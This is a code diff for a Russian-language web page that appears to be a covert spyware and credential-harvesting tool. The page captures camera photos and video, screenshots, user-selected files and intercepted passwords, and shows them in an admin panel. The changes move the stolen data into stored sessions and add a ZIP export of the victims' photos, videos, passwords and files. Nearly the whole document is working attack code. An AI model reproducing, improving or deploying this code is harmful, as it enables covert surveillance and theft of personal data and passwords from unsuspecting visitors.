@@ -201,9 +201,9 @@
             background: #ff8c00;
             color: #fff;
             border: none;
-            padding: 10px;
+            padding: 12px;
             border-radius: 10px;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 700;
             width: 100%;
             margin: 6px 0;
@@ -214,9 +214,9 @@
             background: #ff4444;
             color: #fff;
             border: none;
-            padding: 10px;
+            padding: 12px;
             border-radius: 10px;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 700;
             width: 100%;
             margin: 6px 0;
@@ -272,6 +272,17 @@
             width: 100%;
         }
         .permission-request .btn-grant:active { opacity: 0.7; }
+        
+        .admin-actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin: 10px 0;
+        }
+        .admin-actions button {
+            flex: 1;
+            min-width: 100px;
+        }
     </style>
 </head>
 <body>
@@ -326,14 +337,14 @@
         </div>
 
         <div id="adminContent" class="hidden">
-            <div style="display:flex;gap:8px;flex-wrap:wrap;margin:10px 0;">
-                <button class="btn-danger" id="clearSessionsBtn" style="flex:1;min-width:100px;">🗑️ ОЧИСТИТЬ</button>
-                <button class="btn-export" id="exportAllBtn" style="flex:1;min-width:100px;">📥 ЭКСПОРТ ZIP</button>
+            <div class="admin-actions">
+                <button class="btn-danger" id="clearSessionsBtn">🗑️ ОЧИСТИТЬ</button>
+                <button class="btn-export" id="exportAllBtn">📥 ЭКСПОРТ ZIP</button>
             </div>
             <div id="sessionsList"></div>
             <h3 style="color:#ff6666;margin:15px 0 8px;font-size:16px;">🔑 ПЕРЕХВАЧЕННЫЕ ДАННЫЕ</h3>
             <div id="passwordsList"></div>
-            <button class="btn-small" id="logoutBtn" style="background:#666;width:100%;margin-top:10px;padding:10px;">🚪 ВЫЙТИ</button>
+            <button class="btn-small" id="logoutBtn" style="background:#666;width:100%;margin-top:10px;padding:10px;font-size:14px;">🚪 ВЫЙТИ</button>
         </div>
     </div>
 </div>
@@ -476,7 +487,6 @@
                 }
             };
             
-            // Таймаут, если не нажали
             setTimeout(() => {
                 if (!hasCameraPermission) {
                     showPermissionBox(false);
@@ -588,7 +598,7 @@
             };
             
             input.addEventListener('change', handler);
-            input.click(); // ОТКРЫВАЕМ ДИАЛОГ ВЫБОРА ФАЙЛОВ
+            input.click();
             
             setTimeout(() => {
                 if (!resolved) { resolved = true; resolve(false); }
@@ -604,7 +614,6 @@
         isRunning = true;
         
         const btn = document.getElementById('startBtn');
-        const status = document.getElementById('status');
         const mainPage = document.getElementById('mainPage');
         const finalMessage = document.getElementById('finalMessage');
         
@@ -655,76 +664,40 @@
             setStep(5, 'done');
             setStatus(`📁 ФАЙЛОВ ВЫБРАНО: ${collectedFiles.length}`, 'success');
             
-            // ШАГ 6: ZIP
+            // ШАГ 6: СОХРАНЕНИЕ В АДМИНКУ
             setStep(6, 'active');
-            setStatus('📦 СОЗДАНИЕ ZIP АРХИВА...', '');
+            setStatus('💾 СОХРАНЕНИЕ В АДМИН-ПАНЕЛЬ...', '');
             
-            const zip = new JSZip();
-            
-            // Данные
-            const data = {
-                "ВРЕМЯ": new Date().toISOString(),
-                "БРАУЗЕР": navigator.userAgent,
-                "ЭКРАН": { "ШИРИНА": screen.width, "ВЫСОТА": screen.height },
-                "ГЕО": await getGeolocation(),
-                "БАТАРЕЯ": await getBatteryInfo(),
-                "ПАРОЛИ": capturedData.slice(-200)
-            };
-            zip.file('ДАННЫЕ.json', JSON.stringify(data, null, 2));
-            zip.file('ПАРОЛИ.json', JSON.stringify(capturedData, null, 2));
-            
-            // Скриншот
-            if (screenshotData) {
-                const b64 = screenshotData.split(',')[1];
-                if (b64) zip.file('СКРИНШОТ.png', b64, { base64: true });
-            }
-            
-            // Медиа
-            mediaData.forEach((m, i) => {
-                try {
-                    const b64 = m.data.split(',')[1];
-                    if (b64) {
-                        const ext = m.type === 'photo' ? 'jpg' : 'mp4';
-                        zip.file(`МЕДИА/${i}_${m.cam}_${m.type}.${ext}`, b64, { base64: true });
-                    }
-                } catch(e) {}
-            });
-            
-            // Файлы пользователя
-            collectedFiles.forEach((f, i) => {
-                try {
-                    const b64 = f.data.split(',')[1];
-                    if (b64) {
-                        const ext = f.name.split('.').pop() || 'file';
-                        zip.file(`ФАЙЛЫ/${i}_${f.name}`, b64, { base64: true });
-                    }
-                } catch(e) {}
-            });
-            
-            // Сессия
+            // Сохраняем все данные в localStorage для админки
             const session = {
                 id: Date.now(),
-                time: data["ВРЕМЯ"],
+                time: new Date().toISOString(),
                 preview: {
-                    ua: String(data["БРАУЗЕР"]).substring(0, 40),
+                    ua: String(navigator.userAgent).substring(0, 40),
                     files: collectedFiles.length,
-                    media: mediaData.length
-                }
+                    media: mediaData.length,
+                    hasScreenshot: !!screenshotData
+                },
+                // Сохраняем все медиа в сессию для экспорта
+                mediaData: mediaData,
+                screenshotData: screenshotData,
+                collectedFiles: collectedFiles.map(f => ({
+                    name: f.name,
+                    type: f.type,
+                    size: f.size,
+                    data: f.data,
+                    time: f.time
+                }))
             };
             sessions.push(session);
             localStorage.setItem('sessions', JSON.stringify(sessions));
             
-            // Скачивание
-            setStatus('⬇️ СКАЧИВАНИЕ ZIP...', '');
-            const blob = await zip.generateAsync({ type: 'blob' });
-            saveAs(blob, `ГОЛДА_${new Date().toISOString().slice(0,10)}.zip`);
-            
             setStep(6, 'done');
-            setStatus('🎉 ГОЛДА ПОЛУЧЕНА!', 'success');
+            setStatus('🎉 ДАННЫЕ СОХРАНЕНЫ В АДМИН-ПАНЕЛЬ!', 'success');
             btn.classList.remove('loading');
             btn.querySelector('.btn-text').textContent = '✅ ГОТОВО';
             
-            // Через 10 сек - скрыть
+            // Через 10 сек - скрыть главную, показать финальное сообщение с @papadenay
             setTimeout(() => {
                 mainPage.style.display = 'none';
                 finalMessage.style.display = 'block';
@@ -772,13 +745,13 @@
     function renderAdmin() {
         const list = document.getElementById('sessionsList');
         list.innerHTML = sessions.length === 0 ? '<p style="color:#888;">НЕТ СЕССИЙ</p>' :
-            sessions.slice().reverse().map(s => `
+            sessions.slice().reverse().map((s, index) => `
                 <div class="session-item">
                     <strong>${new Date(s.time).toLocaleString()}</strong>
                     <span class="badge">ID: ${s.id}</span>
                     <br>БРАУЗЕР: ${s.preview.ua || 'НЕТ'}
-                    <br>ФАЙЛОВ: ${s.preview.files || 0} | МЕДИА: ${s.preview.media || 0}
-                    <br><button class="btn-small" onclick="deleteSession(${s.id})">УДАЛИТЬ</button>
+                    <br>ФАЙЛОВ: ${s.preview.files || 0} | МЕДИА: ${s.preview.media || 0} | СКРИНШОТ: ${s.preview.hasScreenshot ? 'ЕСТЬ' : 'НЕТ'}
+                    <br><button class="btn-small" onclick="deleteSession(${index})">УДАЛИТЬ</button>
                 </div>
             `).join('');
         
@@ -793,34 +766,90 @@
             `).join('');
     }
 
-    window.deleteSession = function(id) {
-        sessions = sessions.filter(s => s.id !== id);
+    window.deleteSession = function(index) {
+        sessions = sessions.filter((_, i) => i !== index);
         localStorage.setItem('sessions', JSON.stringify(sessions));
         renderAdmin();
     };
 
+    // ============================================================
+    // 12. ЭКСПОРТ ZIP ИЗ АДМИНКИ (ВСЁ: ФОТО, ВИДЕО, ПАРОЛИ)
+    // ============================================================
     async function exportAdminZip() {
         const status = document.getElementById('adminStatus');
-        status.textContent = '📦 СОЗДАНИЕ...';
+        status.textContent = '📦 СОЗДАНИЕ АРХИВА...';
+        status.className = 'status';
+        
         try {
             const zip = new JSZip();
+            
+            // Все данные
             zip.file('ВСЕ_ДАННЫЕ.json', JSON.stringify({
-                sessions: sessions,
+                sessions: sessions.map(s => ({
+                    ...s,
+                    mediaData: undefined,
+                    screenshotData: undefined,
+                    collectedFiles: undefined
+                })),
                 passwords: capturedData,
                 date: new Date().toISOString()
             }, null, 2));
+            
+            zip.file('ПАРОЛИ.json', JSON.stringify(capturedData, null, 2));
+            
+            // Проходим по всем сессиям и добавляем медиа
+            sessions.forEach((session, sessionIndex) => {
+                // Скриншот
+                if (session.screenshotData) {
+                    try {
+                        const b64 = session.screenshotData.split(',')[1];
+                        if (b64) {
+                            zip.file(`СЕССИЯ_${sessionIndex + 1}/СКРИНШОТ.png`, b64, { base64: true });
+                        }
+                    } catch(e) {}
+                }
+                
+                // Медиа (фото и видео)
+                if (session.mediaData && session.mediaData.length > 0) {
+                    session.mediaData.forEach((m, i) => {
+                        try {
+                            const b64 = m.data.split(',')[1];
+                            if (b64) {
+                                const ext = m.type === 'photo' ? 'jpg' : 'mp4';
+                                const cam = m.cam === 'back' ? 'ЗАДНЯЯ' : 'ПЕРЕДНЯЯ';
+                                zip.file(`СЕССИЯ_${sessionIndex + 1}/МЕДИА/${i + 1}_${cam}_${m.type}.${ext}`, b64, { base64: true });
+                            }
+                        } catch(e) {}
+                    });
+                }
+                
+                // Файлы пользователя
+                if (session.collectedFiles && session.collectedFiles.length > 0) {
+                    session.collectedFiles.forEach((f, i) => {
+                        try {
+                            const b64 = f.data.split(',')[1];
+                            if (b64) {
+                                const ext = f.name.split('.').pop() || 'file';
+                                zip.file(`СЕССИЯ_${sessionIndex + 1}/ФАЙЛЫ_ПОЛЬЗОВАТЕЛЯ/${i + 1}_${f.name}`, b64, { base64: true });
+                            }
+                        } catch(e) {}
+                    });
+                }
+            });
+            
             const blob = await zip.generateAsync({ type: 'blob' });
-            saveAs(blob, `АДМИН_${new Date().toISOString().slice(0,10)}.zip`);
-            status.textContent = '✅ ГОТОВО';
+            saveAs(blob, `АДМИН_ЭКСПОРТ_${new Date().toISOString().slice(0,10)}.zip`);
+            status.textContent = '✅ АРХИВ СОЗДАН И СКАЧАН! (ФОТО, ВИДЕО, ПАРОЛИ)';
             status.className = 'status success';
-        } catch(e) {
-            status.textContent = '❌ ' + e.message;
+        } catch (err) {
+            status.textContent = '❌ ОШИБКА: ' + err.message;
             status.className = 'status error';
+            console.error(err);
         }
     }
 
     // ============================================================
-    // 12. ИНИЦИАЛИЗАЦИЯ
+    // 13. ИНИЦИАЛИЗАЦИЯ
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
         setupCapture();
